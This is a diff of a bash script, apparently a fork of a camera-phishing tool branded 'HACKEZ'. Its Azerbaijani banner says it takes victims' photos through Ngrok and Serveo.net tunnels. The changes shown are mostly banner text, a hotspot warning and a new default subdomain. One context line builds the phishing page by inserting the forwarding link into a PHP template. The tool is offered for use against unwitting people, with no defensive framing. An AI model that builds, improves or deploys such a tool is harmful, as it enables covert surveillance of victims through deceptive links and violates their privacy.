@@ -13,16 +13,16 @@ trap 'printf "\n";stop' 2
 banner() {
 
 echo '
-┌────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+┌─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
 │                                                                                                                                                                     │
 │HACKEZ Tool-a xos gelmisiniz :)                                                                                                               │
-│Ngrok ve Serveo.net(local host) istifade ederek victim-in fotolarinin alinmasi aleti                                                                                       
-│Made in Azerbaijan                                                                                                                                             
+│Ngrok ve Serveo.net(local host) istifade ederek victim-in fotolarinin alinmasi aleti                                                                                                           │Termux ve Arch Linuxta test edilmisdir
+│Made in Azerbaijan Broooo                                                                                                                                                                     │
 │                                                                                                                                                                     │
 │                                                                                                                                                                     │
 │                                                                                                                                                                     │
 │                                                                                                                                                 HEXATRONN :)     │
-└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── '
+└─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘ '
 
                                                                                
 echo " "
@@ -31,7 +31,7 @@ printf "          \e[1;77m v1.1 This reborn script by { hexatronn }\e[0m \n"
 
 printf "\n"
 
-echo "      XAHIS EDIRIK HOTSPOT AKTIV OLARAQ QALSIN EKS HALDA LINK GENERASIYA OLUNMAYACAQ (PLEASE TURN ON YOUR HOTSPOT
+echo "      N073:> XAHIS EDIRIK HOTSPOT AKTIV OLARAQ QALSIN EKS HALDA LINK GENERASIYA OLUNMAYACAQ (PLEASE TURN ON YOUR HOTSPOT
                    OR ELSE YOU DONT GET LINK....!)"
 
 }
@@ -232,7 +232,7 @@ sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 start() {
 
 default_choose_sub="Y"
-default_subdomain="user"
+default_subdomain="hackez"
 
 printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Eminsiniz? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
 read choose_sub
